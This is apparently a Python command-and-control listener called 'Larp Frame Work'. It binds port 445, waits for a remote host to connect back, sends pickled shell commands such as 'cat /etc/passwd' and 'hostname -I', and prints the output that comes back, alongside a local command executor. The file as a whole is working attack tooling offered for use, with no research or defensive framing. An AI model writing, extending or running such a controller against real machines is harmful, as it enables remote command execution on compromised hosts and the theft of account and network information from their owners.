import socket, os, pickle # pickle's my homeboy

# Mostly requires root privileges locally

HOST = "0.0.0.0"
PORT = 445

def execute(cmd):
    print(f"\033[32m[+] Exec:\033[0m {cmd}\n")
    if not cmd:
        return
    os.system(cmd)

def recon_HostnameScan():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST,PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print("\033[32m[+]\033[0m Connected to RHOST!")
            cmd = ["hostname -I", "__eoc__"]
            cmd2 = pickle.dumps(cmd)
            conn.sendall(cmd2)
            print("\033[32m[+]\033[0m Sent payload to RHOST!")
            data = b""
            while True:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                data += chunk
            print("\033[32m[+]\033[0m STDOUT recieved:\n", data.decode(errors="ignore"))
            s.close()

def passwdRead():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST,PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print("\033[32m[+]\033[0m Connected to RHOST!")
            cmd = ["cat /etc/passwd", "__eoc__"]
            cmd2 = pickle.dumps(cmd)
            conn.sendall(cmd2)
            print("\033[32m[+]\033[0m Sent payload to RHOST!")
            data = b""
            while True:
                chunk = conn.recv(1024)
                if not chunk:
                    break
                data += chunk
            print("\033[32m[+]\033[0m STDOUT recieved:\n", data.decode(errors="ignore"))
            s.close()

def helpmebigyahu():
    print("""--\033[34mLarp Frame Work manual\033[0m--
---------\033[34mMISC\033[0m---------
help - Display's this page.
exec [command] - executes a command locally.
---- \033[34mACCESS NEEDED\033[0m ----
HostnameScan - Scan's HOST's interface IP's.
passwdRead - capture stdout of  /etc/passwd.""")

print("\033[32m[+]\033[0m Enter HELP for MAN page.")

while True:
    raw = input("\033[34m(LFW)\033[0m \033[32m$\033[0m ")
    parts = raw.split()

    if not parts:
        continue

    cmd = parts[0].lower()
    args = parts[1:]

    commands = {
        "hostnamescan": recon_HostnameScan,
        "exec": execute,
        "passwdread": passwdRead,
        "help": helpmebigyahu
    }

    if cmd in commands:
        if cmd == "exec":
            command = " ".join(args)
            execute(command)
        else:
            commands[cmd]()
    else:
        print(f"\033[31m[-]\033[0m Unknown command. Did you mean 'exec {cmd}?'")
        continue
